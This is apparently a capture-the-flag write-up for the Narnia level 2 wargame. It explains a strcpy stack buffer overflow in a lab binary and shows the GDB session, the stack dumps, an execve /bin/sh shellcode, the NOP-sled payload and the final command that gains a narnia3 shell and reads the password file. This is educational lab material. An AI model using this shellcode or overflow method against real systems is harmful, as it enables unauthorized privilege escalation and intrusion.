Level 2
	
narnia2@narnia:/narnia$ cat narnia2.c
/*
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
 
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
 
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(int argc, char * argv[]){
char buf[128];
 
if(argc == 1){
printf("Usage: %s argument\n", argv[0]);
exit(1);
}
strcpy(buf,argv[1]);
printf("%s", buf);
 
return 0;
}

This is again another buffer overflow vulnerability in the binary file, the vulnerability is that the user input of “argv[1]” is copied directly into buffer called “buf” using the strcpy() function without any checking of the string and since the buffer is defined to be a length of 128 bytes in size if I send a string of more then 128 bytes I should be able to cause a buffer overflow in the binary’s execution.

Using GDB to debug my fuzzing of the potential buffer overflow. Using python I sent a string of increasing length of A’s until I caused a buffer overflow in the execution, I redid the overflow with the last 4 bytes in the string to be C’s to show the 4 bytes that overwrite the EIP register.

narnia2@narnia:/narnia$ gdb ./narnia2 -q
Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
(gdb) r $(python -c'print "\x41"*140 + "\x43"*4')
Starting program: /games/narnia/narnia2 $(python -c'print "\x41"*140 + "\x43"*4')
 
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) x/300x $esp
0xffffd6a0:    0x00000000    0xffffd734    0xffffd740    0xf7fd3000
0xffffd6b0:    0x00000000    0xffffd71c    0xffffd740    0x00000000
0xffffd6c0:    0x0804821c    0xf7fceff4    0x00000000    0x00000000
0xffffd6d0:    0x00000000    0x8947ceb3    0xbe426aa3    0x00000000
0xffffd6e0:    0x00000000    0x00000000    0x00000002    0x08048370
0xffffd6f0:    0x00000000    0xf7ff0a90    0xf7e453c9    0xf7ffcff4
0xffffd700:    0x00000002    0x08048370    0x00000000    0x08048391
0xffffd710:    0x08048424    0x00000002    0xffffd734    0x08048490
0xffffd720:    0x08048500    0xf7feb660    0xffffd72c    0xf7ffd918
0xffffd730:    0x00000002    0xffffd85e    0xffffd874    0x00000000
0xffffd740:    0xffffd905    0xffffd915    0xffffd920    0xffffd944
0xffffd750:    0xffffd957    0xffffd960    0xffffd96d    0xffffde8e
0xffffd760:    0xffffde99    0xffffdea5    0xffffdef2    0xffffdf09
0xffffd770:    0xffffdf18    0xffffdf24    0xffffdf35    0xffffdf3e
0xffffd780:    0xffffdf51    0xffffdf59    0xffffdf69    0xffffdfa0
0xffffd790:    0xffffdfc0    0x00000000    0x00000020    0xf7fdb420
0xffffd7a0:    0x00000021    0xf7fdb000    0x00000010    0x1f898975
0xffffd7b0:    0x00000006    0x00001000    0x00000011    0x00000064
0xffffd7c0:    0x00000003    0x08048034    0x00000004    0x00000020
0xffffd7d0:    0x00000005    0x00000008    0x00000007    0xf7fdc000
0xffffd7e0:    0x00000008    0x00000000    0x00000009    0x08048370
0xffffd7f0:    0x0000000b    0x000036b2    0x0000000c    0x000036b2
0xffffd800:    0x0000000d    0x000036b2    0x0000000e    0x000036b2
0xffffd810:    0x00000017    0x00000000    0x00000019    0xffffd83b
0xffffd820:    0x0000001f    0xffffdfe2    0x0000000f    0xffffd84b
0xffffd830:    0x00000000    0x00000000    0xd8000000    0x47e342a2
0xffffd840:    0x00a63b75    0x9ab5f04d    0x6903f01d    0x00363836
0xffffd850:    0x00000000    0x00000000    0x00000000    0x672f0000
0xffffd860:    0x73656d61    0x72616e2f    0x2f61696e    0x6e72616e
0xffffd870:    0x00326169    0x41414141    0x41414141    0x41414141
0xffffd880:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd890:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8a0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8b0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8c0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8d0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8e0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd8f0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd900:    0x43434343    0x45485300    0x2f3d4c4c    0x2f6e6962
0xffffd910:    0x68736162    0x52455400    0x74783d4d    0x006d7265
0xffffd920:    0x5f485353    0x45494c43    0x323d544e    0x312e3230
0xffffd930:    0x312e3435    0x322e3530    0x34203834    0x33353038
0xffffd940:    0x00323220    0x5f485353    0x3d595454    0x7665642f
0xffffd950:    0x7374702f    0x4c00372f    0x4c415f43    0x00433d4c
0xffffd960:    0x52455355    0x72616e3d    0x3261696e    0x5f534c00
0xffffd970:    0x4f4c4f43    0x723d5352    0x3a303d73    0x303d6964
0xffffd980:    0x34333b31    0x3d6e6c3a    0x333b3130    0x686d3a36
0xffffd990:    0x3a30303d    0x343d6970    0x33333b30    0x3d6f733a
0xffffd9a0:    0x333b3130    0x6f643a35    0x3b31303d    0x623a3533
0xffffd9b0:    0x30343d64    0x3b33333b    0x633a3130    0x30343d64
0xffffd9c0:    0x3b33333b    0x6f3a3130    0x30343d72    0x3b31333b
0xffffd9d0:    0x733a3130    0x37333d75    0x3a31343b    0x333d6773
0xffffd9e0:    0x33343b30    0x3d61633a    0x343b3033    0x77743a31
0xffffd9f0:    0x3b30333d    0x6f3a3234    0x34333d77    0x3a32343b
0xffffda00:    0x333d7473    0x34343b37    0x3d78653a    0x333b3130
0xffffda10:    0x2e2a3a32    0x3d726174    0x333b3130    0x2e2a3a31
0xffffda20:    0x3d7a6774    0x333b3130    0x2e2a3a31    0x3d6a7261
0xffffda30:    0x333b3130    0x2e2a3a31    0x3d7a6174    0x333b3130
0xffffda40:    0x2e2a3a31    0x3d687a6c    0x333b3130    0x2e2a3a31
0xffffda50:    0x616d7a6c    0x3b31303d    0x2a3a3133    0x7a6c742e
0xffffda60:    0x3b31303d    0x2a3a3133    0x7a78742e    0x3b31303d
0xffffda70:    0x2a3a3133    0x70697a2e    0x3b31303d    0x2a3a3133
0xffffda80:    0x303d7a2e    0x31333b31    0x5a2e2a3a    0x3b31303d
0xffffda90:    0x2a3a3133    0x3d7a642e    0x333b3130    0x2e2a3a31
0xffffdaa0:    0x303d7a67    0x31333b31    0x6c2e2a3a    0x31303d7a
0xffffdab0:    0x3a31333b    0x7a782e2a    0x3b31303d    0x2a3a3133
0xffffdac0:    0x327a622e    0x3b31303d    0x2a3a3133    0x3d7a622e
0xffffdad0:    0x333b3130    0x2e2a3a31    0x3d7a6274    0x333b3130
0xffffdae0:    0x2e2a3a31    0x327a6274    0x3b31303d    0x2a3a3133
0xffffdaf0:    0x3d7a742e    0x333b3130    0x2e2a3a31    0x3d626564
0xffffdb00:    0x333b3130    0x2e2a3a31    0x3d6d7072    0x333b3130
0xffffdb10:    0x2e2a3a31    0x3d72616a    0x333b3130    0x2e2a3a31
0xffffdb20:    0x3d726177    0x333b3130    0x2e2a3a31    0x3d726165
0xffffdb30:    0x333b3130    0x2e2a3a31    0x3d726173    0x333b3130
0xffffdb40:    0x2e2a3a31    0x3d726172    0x333b3130    0x2e2a3a31

After the buffer overflow was caused I used gdb to view the state of the stack at the time of the overflow, the memory address of 0xffffd904 was overwritten by the 4 C’s. Using the same shellcode as I did in the previous challenge I plan to include the shellcode in my buffer and have the memory address of 0xffffd904 jump back to a point in the buffer and begin executing my shellcode. As part of this proposed attack plan I need to verify the length of the shellcode as it is important to send the correct buffer length to the binary.
1
2
	
root@Phlegethon:~# python -c'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
25

So the actual shellcode is 25 bytes in length, the string needs to be 144 bytes in length so I plan to fill the rest of the buffer up with NOPs and the last 4 bytes of the buffer to be the RET address of a memory address within the NOP sled. The below debugging in GDB was to be a PoC of the attack vector as well as to find the memory location of the RET address.

	
(gdb) r $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x43"*4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x43"*4')
 
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) x/250x $esp
0xffffd6a0:    0x00000000    0xffffd734    0xffffd740    0xf7fd3000
0xffffd6b0:    0x00000000    0xffffd71c    0xffffd740    0x00000000
0xffffd6c0:    0x0804821c    0xf7fceff4    0x00000000    0x00000000
0xffffd6d0:    0x00000000    0x86b43b80    0xb1b19f90    0x00000000
0xffffd6e0:    0x00000000    0x00000000    0x00000002    0x08048370
0xffffd6f0:    0x00000000    0xf7ff0a90    0xf7e453c9    0xf7ffcff4
0xffffd700:    0x00000002    0x08048370    0x00000000    0x08048391
0xffffd710:    0x08048424    0x00000002    0xffffd734    0x08048490
0xffffd720:    0x08048500    0xf7feb660    0xffffd72c    0xf7ffd918
0xffffd730:    0x00000002    0xffffd85e    0xffffd874    0x00000000
0xffffd740:    0xffffd905    0xffffd915    0xffffd920    0xffffd944
0xffffd750:    0xffffd957    0xffffd960    0xffffd96d    0xffffde8e
0xffffd760:    0xffffde99    0xffffdea5    0xffffdef2    0xffffdf09
0xffffd770:    0xffffdf18    0xffffdf24    0xffffdf35    0xffffdf3e
0xffffd780:    0xffffdf51    0xffffdf59    0xffffdf69    0xffffdfa0
0xffffd790:    0xffffdfc0    0x00000000    0x00000020    0xf7fdb420
0xffffd7a0:    0x00000021    0xf7fdb000    0x00000010    0x1f898975
0xffffd7b0:    0x00000006    0x00001000    0x00000011    0x00000064
0xffffd7c0:    0x00000003    0x08048034    0x00000004    0x00000020
0xffffd7d0:    0x00000005    0x00000008    0x00000007    0xf7fdc000
0xffffd7e0:    0x00000008    0x00000000    0x00000009    0x08048370
0xffffd7f0:    0x0000000b    0x000036b2    0x0000000c    0x000036b2
0xffffd800:    0x0000000d    0x000036b2    0x0000000e    0x000036b2
0xffffd810:    0x00000017    0x00000000    0x00000019    0xffffd83b
0xffffd820:    0x0000001f    0xffffdfe2    0x0000000f    0xffffd84b
0xffffd830:    0x00000000    0x00000000    0xf5000000    0xbddafb32
0xffffd840:    0xcf3fbc8c    0x499b46af    0x69664c26    0x00363836
0xffffd850:    0x00000000    0x00000000    0x00000000    0x672f0000
0xffffd860:    0x73656d61    0x72616e2f    0x2f61696e    0x6e72616e
0xffffd870:    0x00326169    0x90909090    0x90909090    0x90909090
0xffffd880:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd890:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd8a0:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd8b0:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd8c0:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd8d0:    0x90909090    0x90909090    0x90909090    0x90909090
0xffffd8e0:    0x90909090    0x31909090    0x2f6850c0    0x6868732f
0xffffd8f0:    0x6e69622f    0x5350e389    0xc289e189    0x80cd0bb0
0xffffd900:    0x43434343    0x45485300    0x2f3d4c4c    0x2f6e6962
0xffffd910:    0x68736162    0x52455400    0x74783d4d    0x006d7265
0xffffd920:    0x5f485353    0x45494c43    0x323d544e    0x312e3230
0xffffd930:    0x312e3435    0x322e3530    0x34203834    0x33353038
0xffffd940:    0x00323220    0x5f485353    0x3d595454    0x7665642f
0xffffd950:    0x7374702f    0x4c00372f    0x4c415f43    0x00433d4c
0xffffd960:    0x52455355    0x72616e3d    0x3261696e    0x5f534c00
0xffffd970:    0x4f4c4f43    0x723d5352    0x3a303d73    0x303d6964
0xffffd980:    0x34333b31    0x3d6e6c3a    0x333b3130    0x686d3a36
0xffffd990:    0x3a30303d    0x343d6970    0x33333b30    0x3d6f733a
0xffffd9a0:    0x333b3130    0x6f643a35    0x3b31303d    0x623a3533
0xffffd9b0:    0x30343d64    0x3b33333b    0x633a3130    0x30343d64
0xffffd9c0:    0x3b33333b    0x6f3a3130    0x30343d72    0x3b31333b
0xffffd9d0:    0x733a3130    0x37333d75    0x3a31343b    0x333d6773
0xffffd9e0:    0x33343b30    0x3d61633a    0x343b3033    0x77743a31
0xffffd9f0:    0x3b30333d    0x6f3a3234    0x34333d77    0x3a32343b
0xffffda00:    0x333d7473    0x34343b37    0x3d78653a    0x333b3130
0xffffda10:    0x2e2a3a32    0x3d726174    0x333b3130    0x2e2a3a31
0xffffda20:    0x3d7a6774    0x333b3130    0x2e2a3a31    0x3d6a7261
0xffffda30:    0x333b3130    0x2e2a3a31    0x3d7a6174    0x333b3130
0xffffda40:    0x2e2a3a31    0x3d687a6c    0x333b3130    0x2e2a3a31
0xffffda50:    0x616d7a6c    0x3b31303d    0x2a3a3133    0x7a6c742e
0xffffda60:    0x3b31303d    0x2a3a3133    0x7a78742e    0x3b31303d
0xffffda70:    0x2a3a3133    0x70697a2e    0x3b31303d    0x2a3a3133
0xffffda80:    0x303d7a2e    0x31333b31

So I chose the memory location of “0xffffd8c0” which is located in the middle of the NOP sled. I then took my exploit string and exploited the buffer overflow vulnerability to gain a shell with the privileges of the narnia3 and then cat the password file of narnia3.

	
narnia2@narnia:/narnia$ ./narnia2 $(python -c'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xc0\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
**********
